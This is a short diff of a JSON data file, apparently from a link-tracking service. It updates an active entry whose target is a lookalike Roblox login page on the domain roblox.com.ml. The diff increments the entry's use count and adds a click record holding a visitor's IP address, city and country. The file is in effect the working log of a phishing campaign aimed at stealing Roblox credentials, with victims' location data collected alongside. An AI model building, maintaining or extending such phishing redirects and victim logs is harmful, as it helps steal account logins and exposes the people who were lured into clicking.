@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 164,
+    "useCount": 165,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1424,6 +1424,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1776958971500,
+        "ip": "213.55.241.180",
+        "country": "Switzerland",
+        "city": "Zurich",
+        "flag": "🇨🇭",
+        "countryCode": "CH"
       }
     ]
   },
